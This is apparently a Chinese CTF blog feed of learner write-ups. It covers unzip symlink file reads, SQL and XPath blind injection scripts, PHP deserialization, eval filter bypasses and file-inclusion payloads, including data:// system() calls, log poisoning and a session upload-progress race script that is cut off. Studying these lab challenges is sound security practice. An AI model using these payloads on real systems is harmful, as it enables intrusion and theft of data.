这里的第二个参数用r表示是读取zip文件    # 　unzip_file.namelist() ：获取zip文档内所有文件的名称列表。    if session[&#39;is_login&#39;] != True:        return &#39;not login&#39;    try:        if unzip_filename.find(&#39;/&#39;) != -1: # 如果文件名中没有找到 /            shutil.rmtree(path_base) # 递归的删除文件，这个path_base是到ip的文件夹，无所谓么，反正都删除了，，            os.mkdir(path_base) # 创建一个新的，            return &#39;error&#39;        image = open(path+unzip_filename, &quot;rb&quot;).read() # 只读二进制打开这个文件，然后读取，二进制读取，应该是图片了啊 ，        resp = make_response(image)        resp.headers[&#39;Content-Type&#39;] = &#39;image/png&#39;        return resp    except Exception as e:        shutil.rmtree(path_base)        os.mkdir(path_base)        return &#39;error&#39;return render_template(&#39;upload.html&#39;)@app.route(&#39;/showflag&#39;)def showflag():if True == False: # 这个是真的秀起来了啊，，，可能是要修改什么参数把，，不知啊，修改参数能把他俩改的相等？！？！？！那是真的秀，    image = open(os.path.join(&#39;./flag/flag.jpg&#39;), &quot;rb&quot;).read()    resp = make_response(image)    resp.headers[&#39;Content-Type&#39;] = &#39;image/png&#39;    return respelse:    return &quot;can&#39;t give you&quot;</code></pre><p>在网上看见的以为博主写的，我人菜还不喜欢分析代码。。。。。。真的是</p><p>总体来说就是第一需要传递以.zip结尾的图片</p><blockquote><p>if “zip” != filename.split(‘.’)[-1]: # 检查后缀，<br>            return ‘zip only allowed’</p></blockquote><p>然后第二，服务器会解压我们传递的文件</p><blockquote><p>unzip -n -d “+path+” “+ pathname </p></blockquote><p>我们要穿的文件是图片</p><blockquote><p>open(path+unzip_filename, “rb”).read()因为这里是二进制读取</p></blockquote><p>最后，我们传的文件名不能有‘/’</p><p>因为我不大清楚路由嘛，然后我就很奇怪，为什么下面有一个showflag的路由，然后给了一个图片的地址./flag/flag.jpg，很迷惑，但是感觉肯定不能读到了毕竟true绝对不会等于false啊，那我感觉这段代码存在的意思就是在告诉我，我们这里存在一个flag.jpg然后我把路径给你看你能不能拿到</p><p>那我想可以可以传一个图片马，但是我上传之后就出现错误了，返回了error，代码里面有一段是不能出现‘；’这个符号的</p><p>然后就很不知所措</p><p>看wp说unzip存在一个漏洞就是unzip软连接攻击，可以上传软连接的压缩包来读取文件。就是相当于windows里面的快捷方式，其实快捷方式那个文件里存储的是真正文件的地址。</p><p>在kali上，使用 ln -s命令相当于创建一个软连接</p><p>又是那个/proc/self/cwd我不知道见过几次了但依旧还是很蒙蔽，就是指向当前进程</p><p>写出这样的软连接ln -s /proc/self/cwd/flag/flag.jpg test</p><p>其实解释即使proc/self/cwd就可以指向flask那个目录，然后目录在详细一些就是在flag/flag。jpg</p><p>然后我们将其test变成指向这个地址的快捷方式</p><p>然后将其进行压缩</p><p>zip -ry test.zip test </p><p>r:递归处理文件下所有的子文件<br>y：直接处理软连接，而非处理它所存在的地址所指向的文件</p><p>如果我们直接只用r参数是会报错的，因为我们电脑里根本就没有这个flag/flag.jpg这个文件</p><p><img src="4.PNG"></p><p>然后上传，抓包得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019-Web1</title>
      <link href="/2021/05/17/SWPU2019-Web1/"/>
      <url>/2021/05/17/SWPU2019-Web1/</url>
      
        <content type="html"><![CDATA[<p>#写在前面</p><p>这道题虽然没有做出来，但是我找到了注入点，我不再是从前哪个哪个类型的题目都不知道的小垃圾的。但是。。。因为知识储备的太少，我依然没有做出来</p><span id="more"></span><h2>前置知识</h2><blockquote><p>group by</p></blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12590172.html">order by希望学习一下</a></p><p>在做这道题目的时候，我fuzz发现#被过滤，我就想说这要怎么进行注释，然后我特别啥的试了下%23，哇偶，它没有被过滤。。。。。其实这个不是url<br>不会进行url解码，所以这个%23，是没有任何作用的，所以我学到了一种新的方法：</p><p>1’,xxx,’1,在输入一个数据将其闭合</p><p>其实我学sql以来，在爆库的时候就学了两种方法，通过联合查询，另外就是报错注入，堆叠注入也算是一种把。但是我内心不知道为啥总是比较抵触联合查询，因为联合查询第一点就是要进行看有几个字段嘛，我因为不是特别理解 order by跟group by，所以总是不喜欢用这个，另外内心觉得这个很简单（因为我入门的时候，第一个接触的就是这个，所以就感觉不会用到，但是这是大错特错！！！！）</p><p><img src="1.PNG"></p><p>先看下order by，我理解了什么意思，就是如果我们输入1’ order by 4 ,’1</p><p>那我们输入的其实是select * from ‘1’ order by 3,’1’</p><p><img src="2.PNG"></p><p>我们可以看一下字符型和数字性的，如果是图中的第一个就是按照第几列的某中顺序进行排列，那么我们就可以从1输到一个任意指导出现报错的输就代表我们成功了</p><p>group by在我理解来就是去除了你要的哪一列的重复项</p><p><img src="3.PNG"></p><p><img src="4.PNG"></p><p>然后我们就可以用这两个函数来去fuzz有几个字段。</p><p><img src="5.PNG"></p><p>回到我们题目上，因为如果输入空格，比如show databases;它会自动变成showdatabases；就会出错，所以我们用/**/来进行过滤，然后因为order by被过滤所以我们只能使用group by。</p><p>但是这道题最坑的是它竟然有22个字段，这谁能想到啊啊啊啊啊啊，所以写给我提了个醒，如果以后要进行fuzz字段，我就可以直接搞个大的，在一二分的方式进行，太坑了。。。。</p><p>然后我需要知道，这22个字段里谁的东西会显示在广告名或广告内容上。</p><p>因为我之前用这个方法的次数很好，我竟然不知道联合查询的步骤，我把这个和fuzz字段弄混在一起了</p><p>1’/<strong>/union/</strong>/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p><p><img src="8.PNG"></p><p>因为我们不是知道有22个字符嘛，然后我们进行联合查找，然后送图中可以看到我们的1，2，3，4，5，6，7，8另其了一行。</p><p>其实我们通过这个可以知道广告名，广告内容它们所在的字段的位置，一位哦毕竟我们想要flag，22个字段的内容必然不会全部显示在屏幕上，所以通过这个测试我们就可以知道两个字段里有我们想要的东西。</p><p><img src="9.PNG"></p><p>1’/<strong>/union/</strong>/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p><p><img src="10.PNG"></p><p>成功得到了库名，但是其实做了一些ctf题目后，我有发现其实库名要不要无所谓，因为我们想要得到表名，我们可以使用where table_schema=database();来获取表明，但是这道题目emmmm，information_schema被过滤了</p><p>所以我们就进行关于information_schema的过滤<a href="https://www.anquanke.com/post/id/193512">bypass</a>，</p><p>但是由于buu上环境的问题所以就不能进行所以看WP，就盲猜在users表中</p><p>然后嘛就是因为毕竟information被过滤，我们只能通过无列名注入得到我们的想要的</p><p>1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>4</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3,4,5,6/</strong>/union/<strong>/select/</strong>/*/<strong>/from/</strong>/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p><p>然后这里就又学到了一个新的知识，无列名注入，顾名思义就是我们不知道字段的名字，但是我们还想要拿到字段的信息</p><p><img src="9.PNG"></p><p>在这里我们可以看到一共有8个字段，但是如果我们不知道字段的名字，我们应该怎么做呢</p><p><img src="10.PNG"></p><p>我们可以看到每个列的名字都被相应的数字覆盖了</p><p><img src="11.PNG"></p><p>可以看到当我重新构造了一个表a的时候，我可以单独把每一个字段里的内容都重新列了出来，所以现在我们就可以不通过字段名进行注入了。</p><p>但是如果反引号被过滤了，那我们该怎么办呢？</p><p><img src="12.PNG"></p><p>如果反引号被过滤了可以这样子搞</p><p>然后</p><blockquote><p>1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>3</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3/</strong>/union/<strong>/select/</strong>/*/<strong>/from/</strong>/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,’22</p></blockquote><p>然后我们通过注入得到flag，但是注意表users中的字段也是需要一步一步测出来的。</p><p><img src="13.PNG"></p><p>好嘞，到最后在去了解一下如果information_schema被过滤了应该怎么办吧</p><p>其实为什么information——schema很重要就是我们在注入的时候要通过它来进行爆库，爆表包字段，然后一旦它被禁用就好像我们失去了一个超级有利的武器</p><blockquote><p>sys.schema_auto_increment_columns</p></blockquote><p>其实我们在设计表的时候一旦都会涉及一个id的字段，里面的id就是从0开始进行添加</p><p>而schema_auto_increment_columns，该视图的作用简单来说就是对表自增id的监控</p><blockquote><p>sys.schema_auto_increment_columns</p></blockquote><p>但是有的情况下因为有些就是没有id，我们可以用sys.schema_table_statistics_with_buffer绕过</p><p>payload:</p><blockquote><p>?id=-1’ union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()–+</p></blockquote><blockquote><p>?id=-1’ union all select*from (select * from users as a join users b)c–+</p></blockquote><blockquote><p>?id=-1’ union all select*from (select * from users as a join users b using(id,username))c–+</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezlogin</title>
      <link href="/2021/05/14/NPUCTF2020-ezlogin/"/>
      <url>/2021/05/14/NPUCTF2020-ezlogin/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><span id="more"></span><p>打开题目，又是一道登录界面的题目，但是尝试扫描目录什么都没有，抓包后发现，<username>1</username><password>1</password><token>da1e1b4e62b5a2f21dbe9bTYyMTAwMzM</token>很奇怪，看WP发现是xpath盲注</p><p><a href="https://xz.aliyun.com/t/7791">关于xpath</a></p><p>采用大佬脚本爆破</p><pre><code>    import requests    import re    s = requests.session()    url =&#39;http://47e7790f-8a53-4efa-988b-7a350ebb91d5.node3.buuoj.cn//login.php&#39;head =&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;,&quot;Content-Type&quot;: &quot;application/xml&quot;&#125;find =re.compile(&#39;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#39;)strs =&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;flag =&#39;&#39;for i in range(1,100):    for j in strs:    r = s.post(url=url)    token = find.findall(r.text)    #猜测根节点名称    payload_1 = &quot;&lt;username&gt;&#39;or substring(name(/*[1]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    #猜测子节点名称    payload_2 = &quot;&lt;username&gt;&#39;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    #猜测accounts的节点    payload_3 =&quot;&lt;username&gt;&#39;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    #猜测user节点    payload_4 =&quot;&lt;username&gt;&#39;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    #跑用户名和密码    payload_username =&quot;&lt;username&gt;&#39;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    payload_password =&quot;&lt;username&gt;&#39;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#39;&#123;&#125;&#39;  or &#39;&#39;=&#39;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;.format(i,j,token[0])    print(payload_password)    r = s.post(url=url,headers=head,data=payload_username)    print(r.text)    if &quot;非法操作&quot; in r.text:        flag+=j        print(flag)        breakif &quot;用户名或密码错误!&quot; in r.text:    breakprint(flag)</code></pre><p>得到密码，用户名，然后根据base64读取flag，注意大小写绕过</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-misc</title>
      <link href="/2021/05/13/ctfshow-misc/"/>
      <url>/2021/05/13/ctfshow-misc/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>菜鸡web狗，也想学misc,题目上有句话，每道题你都要想一想flag藏在哪里，为什么要藏在这里</p><span id="more"></span><h2>misc 1</h2><p>下载图片，打开就是flag,可以用QQ里面的提取图片中的文字，或者使用tesseract</p><h2>misc 2</h2><p>打开是一个txt文件，通过记事本或者winhex可以看出其为png文件，改后缀名</p><h2>misc 3</h2>是bpg后缀的文件，可以用工具进行解压，然后在根目录下使用 bpgdec -o out.png misc3.bpg前者是想要输出图片的名字（自定义），后者是bpg文件的名称。bpg是jpg，png的一种压缩形势，上述只是将其解压为正常的图片<h2>misc 4</h2>[hex 文件头](https://www.cnblogs.com/lzlzzzzzz/p/11397307.html)<p>一一对应找到，其真正的后缀进行修改<br>52 49 46 46是那个 .wepg 后缀</p><p><a href="https://exif.tuchong.com/">https://exif.tuchong.com/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>津门杯wp</title>
      <link href="/2021/05/10/%E6%B4%A5%E9%97%A8%E6%9D%AFwp/"/>
      <url>/2021/05/10/%E6%B4%A5%E9%97%A8%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>菜鸡本鸡，一道都没有做出来，只能跟着WP走一遍，学点知识。</p><span id="more"></span><h2>power_cut</h2><p>题目类型：反序列化以及信息收集</p><p>打开题目给出了一段话：昨天晚上因为14级大风停电了</p><p>看到这句话就有点懵？？？这是啥，然后扫目录扫出来是.index.php.swp，哦明白了，因为大风停电导致异常退出。</p><p>然后下载出来的文件，我用记事本勉强能看出来是反序列化，因为代码是乱的。在群里问了大佬后，是用 vi -r index.php.swp</p><p>源码</p><pre><code>&lt;?phpclass logger&#123;public $logFile;public $initMsg;public $exitMsg;function __construct($file)&#123;    $this-&gt;initMsg=&quot;#--session started--#\n&quot;;    $this-&gt;exitMsg=&quot;#--session end--#\n&quot;;    $this-&gt;logFile=$file;    readfile($this-&gt;logFile);&#125;function log($msg)&#123;    $fd=fopen($this-&gt;logFile,&quot;a+&quot;);    fwrite($fd,$msg.&quot;\n&quot;);    fclose($fd);    echo(&#39;log&#39;);&#125;function __destruct()&#123;    echo &quot;destruct！&quot;;&#125;&#125;class weblog&#123;public $weblogfile;function __construct()&#123;    $flag=&quot;system(&#39;cat /flag&#39;);&quot;;    echo &quot;$flag&quot;;&#125;function __wakeup()&#123;    //self::waf($this-&gt;filepath);    $obj=new logger($this-&gt;weblogfile);&#125;public function waf($str)&#123;    $str=preg_replace(&quot;/[&lt;&gt;*#&#39;|?\n ]/&quot;,&quot;&quot;,$str);    $str=str_replace(&#39;flag&#39;,&#39;&#39;,$str);    return $str;&#125;function __destruct()&#123;    echo &quot;this is destruct&quot;;&#125;&#125;$log=$_GET[&#39;log&#39;];$log=preg_replace(&quot;/[&lt;&gt;*#&#39;|?\n ]/&quot;,&quot;&quot;,$log);$log=str_replace(&#39;flag&#39;,&#39;&#39;,$log);;echo($log);$log_unser=unserialize($log);</code></pre><p>我做不出来的点是，我钻牛角尖了，我刚开始写的exp是</p><p><img src="1.PNG"></p><p>因为我想通过触发construct来执行system函数。但是一直没有成功，于是思维就卡在这里了。</p><p>但是忽略了一个特别重要的函数readfile，我没有想到让$file=/flag，直接去执行读取flag中的内容，毕竟system（‘cat /flag’）已经提示了flag的位置，因为后面有一个将log中的flag替换为‘’，于是我们使用双写绕过就可以了</p><p>exp:</p><p><img src="2.PNG"></p><p>问了大佬</p><p><img src="3.png"></p><p>瞬间明白，这接变成了N了<br>又瞬间不明白了</p><h2>hate_php</h2><pre><code>&lt;?phperror_reporting(0);if(!isset($_GET[&#39;code&#39;]))&#123;highlight_file(__FILE__);&#125;else&#123;$code = $_GET[&#39;code&#39;];if(preg_match(&quot;/[A-Za-z0-9_$@]+/&quot;,$code))&#123;    die(&#39;fighting!&#39;); &#125;eval($code);&#125;</code></pre><p>先分析一下，本来eval我们都知道就直接system(‘ls’);就可以了，但是本道题目过滤了字母，所以很遗憾不可以，我们要想什么可以代替system，我们知道又passthru，echo，但是都是字母。</p><p>有一点echo可以用&lt;?=代替<br>我们先写一个不带任何过滤的代码</p><p>分别执行</p><p><img src="4.PNG"></p><p><img src="5.PNG">  (ps,少写了一个=)</p><p>其实如果我们传入得是 <?=就相当于是 eval<?`ls`;前面得<? 没有被闭合，所以出现错误，现在我们需要做的就是将前面得<?闭合，我们需要输入?>&lt;?=<code>ls</code>;即可</p><p><img src="6.PNG"></p><p>我们尝试去上传一个文件来执行命令</p><p><img src="7.PNG"></p><p>我们可以看到我们上传得临时文件，被放在了/tmp/php??????中，所以我们尝试通过包含这个文件来执行我们的命令了</p><p>我们知道当我们在文件中写入ls，然后去利用source 文件名，是可以执行命令的。但是我们需要找到他的一个替代品，就是<code>.</code>，当我们使用 . 文件名的时候也是可以执行这个命令了所以我们就可以利用?&gt;&lt;?=<code>.%20??p/p?p??????</code>;来执行我们的命令，%20是空格的意思。</p><p>我有想到为什么红包题是这个payload而web55是.%20/???/????????[@-[]因为其利用的是system而这个利用的是eval，做红包题而且还没有过滤p，我在看津门杯wp的时候是这样写的?&gt;&lt;?=<code>.%20???/????????[?-[]</code>;来得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-文件包含</title>
      <link href="/2021/05/07/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2021/05/07/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>加油加油加油</p><p>今天比较开心的是对hackbar有了进一步的了解</p><span id="more"></span><h2>web 78</h2><p><img src="1.PNG"></p><p>特点：没有一点点过滤</p><p>想到到payload：</p><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>?file=PHP://Filter/read=convert.base64-encode/resource=flag.php(如果有大小写限制，绕过大小写限制)</p><p>?file=data://text/plain,<?php system('cat flag.php');?>（大小写绕过可以同上）</p><p>?file=data://text/plain,<?=system('cat flag.php');?>（短标签绕过）</p><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==(base64编码绕过)</p><p>?file=php://input  post:<?php system('ls');?></p></blockquote><h2>web 79</h2><p><img src="2.PNG"></p><p>特点：过滤了php，但是没有绕过大小写</p><blockquote><p>?file=pHp://input post:<?php system('ls');?></p><p>?file=data://text/plain,<?=eval($_POST[1]);?> post:1=system(‘ls’);</p><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==(<?php system('cat flag.php');?>)</p></blockquote><h2>web 80</h2><p>特点：过滤了php，data但是没有过滤大小写</p><p><img src="3.PNG"></p><p>上面2的一些方法还是可以用的，这里介绍一下新的方法，这个可以绕过open_dir</p><p>?file=phP://input</p><p>一个类： DirectoryIterator</p><pre><code>&lt;?php$dir = new DirectoryIterator(&quot;glob:///var/www/html/*&quot;);foreach ($dir as $file)&#123;   echo($file-&gt;__tostring().&#39; &#39;);&#125;exit(0);?&gt;</code></pre><p><a href="https://blog.csdn.net/weixin_45551083/article/details/110109369">学习的文章</a></p><p>还有一个是进行日志包含getshell</p><p>日志文件路径 ?file=/var/log/nginx/access.log</p><p>进行日志文件包含的主要步骤是，先将在user-agent哪里进行包含，然后在url那里写出日志的路径</p><p><img src="4.PNG"></p><p>在firebasky师傅那里学到了如果cat被过滤我们可以使用base64相当于cat，大佬们果然都很秀</p><h2>web 81</h2><p>同80，主要的一点就是加上过滤了 :</p><p>用日志包含也是可以的</p><p>跟着大佬就是说了一种新的方法</p><p><img src="5.PNG"></p><p><img src="6.PNG"></p><p>然后使用短标签也是可以的</p><h2>web 82</h2><p>这道题目跟上述题目不同的地方在于这道题目过滤了“.”,那就说明我们只能包含一个无后缀的文件，php里面我们能控制的唯一的那就只能是session，所以这道题目就是从这里看出我们要采用的方法是session.upload_progress</p><p>下面的内容摘自网络</p><p>在了解session包含文件漏洞及绕过姿势的时候，我们应该首先了解一下服务器上针对用户会话session的存贮和处理过程是什么。</p><p>php将session以文件的形势存储在服务器的某一个文件中，所以我们在进行包含的时候知道文件的默认存贮位置是必需的</p><p>默认路径：</p><p>/var/lib/php/sess_PHPSESSID</p><p>/var/lib/php/sessions/sess_PHPSESSID</p><p>/tmp/sess_PHPSESSID</p><p>/tmp/sessions/sess_PHPSESSID</p><p>知道路径之后，我们还需要知道服务器是怎么存放文件的，就是所我们需要知道服务器存放文件的文件名称，它的命名格式是什么，只有这样的话我们才能更好的包含</p><p>session的命名格式是sess_[phpsessid],phpsessid在发送的cookie中可以看到</p><p>好了，上述我们知道了php是怎么存储session文件的，现在我们需要了解一下php是怎么处理用户的session会话信息的。</p><p>php中针对用户会话的处理方式主要取决于服务器在php.ini或代码中对session.serialize_handler(捎带插一嘴，我记得这玩意我在做反序列化的时候也见过，但是至于该怎么应用到解题方向上，我暂时想不出来了，嘤嘤嘤，等把文件包含学完了在去复习一下反序列化)</p><p>我们需要知道php怎么处理session信息的，才能向session文件中插入我们想的getshell的恶意代码</p><p>php默认的会话处理方式就是session.serialize_handler=php</p><p><img src="1.jpg"></p><p>我们可以发现只有用户名的内容进行了序列化的存贮，但是变量名没有，username|s:4:’Qftm’</p><p>但是如果我们采用session.serialize_handler=php_serialize 就可以发现无论是变量名还是变量的内容都被进行了序列化的存储，这里就不配图了 a:1:{s:8:’username’;s:4:’Qftm’}</p><p>这两种存储方式不同，所以我们就要合理利用这两种方式</p><p>好了，上述我们已经了解了session的存储和处理机制，现在我们就要深入的了解一下session文件包含漏洞</p><p>简单的说，就是我们可以控制session文件里的一些内容，将这些内容变为我们的恶意代码，然后将这些内容包含到session文件里面去，就可以拿到服务器权限</p><p>现在我们通过一个简单的案例来说明一下</p><p>session.php</p><pre><code>&lt;?phpsession_start();$username=$_POST[&#39;username&#39;];$_SESSION[&quot;username&quot;]=$username;</code></pre><p>index.php</p><pre><code>&lt;?php$file=$_GET[&#39;file&#39;];include($file);</code></pre><p>从session.php中我们可以看到这个session是用户可以控制的，我们可以在这里插入一段恶意代码</p><p><img src="7.png"></p><p>可以看到有会话产生，我们也得到了phpsessid，所以我们可以进一步的构造</p><p><img src="2.jpg"></p><p>这是复制别人的图，我实验的时候没有成功应该是php.ini设置的有问题，果断时间试试在kali上下载一个phpstudy好好玩玩</p><p>嘿嘿，我整出来了</p><p><img src="9.PNG"></p><p><img src="10.PNG"></p><p>对上述实验做一个小结，我们看在session那里是可以传入session，而且不受限制，所以我们就是以传入我们写的恶意代码，php将我们传入的session进行处理存储在/var/lib/php/session里面，这是路径我们可以通过phpinfo（）进行查看。然后在index.php中存在include函数，当我们知道了session存贮的路径和文件名之后，我们就可以将我们的代码包含进去，然后通过post或者get方式进行getshell。</p><p>很简单是吧，如果这么简单的话那我们的信息将变得多么廉价，随便盗取就可以拿走，所以服务器在对用户信息的处理肯定是做了很多的限制</p><p>session base64encode</p><p>很多时候服务器上的session的信息会由base64编码后在进行存贮，我们在进行本地包含的时候要怎么进行绕过呢？</p><p>再看一个例子</p><p>session.php</p><pre><code>&lt;?phpsession_start();$username=$_POST[&#39;username&#39;];$_SESSION[&quot;username&quot;]=base64_encode($username);echo &quot;user-&gt;$username&quot;;</code></pre><p>index.php</p><pre><code>&lt;?php$file=$_GET[&#39;file&#39;];include($file);</code></pre><p><img src="8.png"></p><p>然后当我们像上述例子中包含恶意代码的时候，我们会发现，我们的内容被base64编码了</p><p><img src="3.jpg"></p><p>那么我们想是不是我们对他进行解码在包含是不是就可以了？</p><p>?file=php://filter/read=convert.base64-decode/resource=/var/lib/php/session/sess_phpsessid</p><p><img src="4.jpg"></p><p><img src="11.PNG"></p><p>但是乱码了！！！</p><p>是因为serialize_handler=php的原因</p><p>上述的图中我们可以看到，只有我们传入的恶意代码的地方被进行了编码，也就是说我们的username则个变量名没有进行编码，但是我们全部将其进行了解码，以至于造成了乱码</p><p>那我们怎么才能然只有base64编码的地方进行解码，其他地方的保持不变？</p><p>答案是有的，现在让我们了解一下base64编码与解码的原理(ps:我记得base64编码与解码的原理，在当时实验室面试的时候有学长问过我，我不会，现在依然不会。。。。。。。感谢这篇文章的作者！！！)</p><h3>base64编码解码</h3><p>我们知道base64是使用了64个可打印字符（a-z,A-Z,0-9,+,/）将任意字符序列编码成ascii字符串以及‘=’用作后缀用途</p><p>base64索引表</p><p><img src="5.jpg"></p><p>base64编码的过程</p><p>将输入的字符串按字节进行切分，不足8比特的高位补零，然后取其二进制，然后将这些二进制串联起来，按照6比特进行切分，因为2^6=64，然后在base64索引表中查找其对印的值，然后将上述的结果串联起来就是我们要的base64编码后的结果</p><p>由于二进制的是按照8比特一组进行传输，然后按照6比特一组进行切分，那么我们进行的二进制的数据必需是24比特的倍数，因为24比特是（6和8的最小倍数），24比特就是3字节，如果原字节的数据长度不是3的倍数且剩下一个输入数据，则在编码的结果加一个=；若剩下两个输入数据，则加一个==</p><p><img src="6.jpg"></p><p>通过这张图我们可以更直观的连接编码的过程</p><p>解码过程就是编码的逆过程</p><p><a href="https://blog.csdn.net/wo541075754/article/details/81734770">详细学习</a></p><p>base64解码的特点：base64编码的时候只包含64个可打印字符，而php在解码的时候如果遇到了不可打印的字符，就将其跳过，仅将合法的字符组成一个新的字符串进行解码（ps：这句话好像在哪里听到过，好像是一道ctf题目用到了这个特点，aaa想不起来在哪里做过这个的题目，果然做了好多题目依旧啥都不会。。。）</p><p><img src="7.jpg"></p><p>好了介绍了这么多我们要回归正题了</p><p>其实上述的我们传入的username之后进行编码之后，是长这样的 username|s:40:’base64编码的内容’，我们知道base64在解码的时候是将四字节转化为3字节，base64编码的内容是一定满足这个道理的，但是前面的内容如果不满足这个道理就会造成乱码</p><p>依照这个道理，如果session存贮信息中用户名编码后的长度为个位数，就是s:0-9，那么username|s:0-9:”，这部分长度是14，实际解码的部分是username0-9，实际长度是10，缺少了两个字节，我们需要将其补为：username0-9XX,如果是s:10-99,我们需要将其补为username10-99X,但是如果用户名编码是3位数，就正好满足我们的要求</p><p><img src="12.PNG"></p><p><img src="13.PNG"></p><p>嘤嘤嘤好想试一试，但是就是不知道哪一点出错了所以就是不行，等把作业补完了在kali上搞一搞</p><p>回顾一下这个实验：</p><p>首先这个比上一个实验加了base64编码，就造成我们想插入代码，但是被编码，造成我们不能成功的进行包含。但是我们想如果我们将其进行解码，就可以成功的进行包含，但是我们又遇到了一个问题，因为username|s:这部分是没有进行编码的，如果它们字节的长度不满足我们解码的规则我们就会产生乱码，所以此时我们需要在我们的编码的时候去将字符串的长度搞到三位数符合我们的规则即可</p><p>昨天晚上我想了一下，这玩意我在ctf中能干啥，感觉ctf中如果要用上这方面的知识，出题人肯定会整很多限制，就比如果说把‘.’给过滤了</p><p>如果它的php处理方式设置为serialize_handler=php_serialze?该怎么办呢？</p><p>其实我们知道php_serialize处理的信息是长这样的：a:1:{s:8:”username”;s:12:”PD8xMjM/Pg==”;}，除去不可建字符是a1s8usernames12是15个字节，所以我们需要将长度扩到三位数，就欧克了做法同上述的方法相同</p><h3>no session_start</h3><p>终于到了涉及到本题目的知识点了</p><p><img src="14.png"></p><p>我们来看一下题目，没有session_start，我们知道session_start通常作为会话的开始出现在网站的登录页面，但是如果一个占点又LFI漏洞但是却没有session_start，那我们该怎么包含用户信息呢？</p><p>很巧。系统本身有地方帮助我们产生session，并且有一部分是可控的</p><p>所以我们就要了解一下session在系统中的配置</p><p>默认情况下，session.use_strict_mode的值是0，此时用户是可以自己定义自己的session id的，就比如说如果我们设置cookie为lucky，那么php就会在文件中创建一个sess_lucky的文件,但是这个技巧的实现需要我们初始化就是session_start，但是现在我们讨论的就是站点没有初始化这个过程，那我们应该怎么办呢</p><p>我们来看一下php.ini中几个关键的配置</p><p><img src="16.PNG"></p><p><img src="17.PNG"></p><blockquote><p>session.auto_start:顾名思义，如果开启这个选项，则会自动初始化session，但是不巧的是，默认情况下是关闭的<br><br>session.upload_progress.enabled=on,默认情况下就是开启的，php能够在每一个文件上传的时候检测上传进度</p></blockquote><blockquote><p>session.upload_progress.cleanup=on:默认开启，就是一旦文件上传结束，就立刻删除对应的session内容</p></blockquote><blockquote><p>session.upload_progress:最初是php为上传进度条设计的一个功能，在上传文件较大的情况下，php将以流的形势上传，并将进度信息放在session中，即使用户没有初始化session，php也会自动初始化session</p></blockquote><blockquote><p>session.upload_progress.name同名变量时（这部分数据用户可控），上传进度可以在session中获取。当php检测到这种post请求的时候，它会在session中添加一组数据，索引时session.upload_progress.prefix=”upload_progress_”，与session.upload-progress.name连起来的值</p></blockquote><p>因为有clean存在，所以我们就要在clean之前把我们的文件包含进去，脚本</p><pre><code>import ioimport sysimport requestsimport threadingsessid = &#39;Qftm&#39;def POST(session):    while True:        f = io.BytesIO(b&#39;a&#39; * 1024 * 50)        session.post(            &#39;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#39;,            data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#39;cat 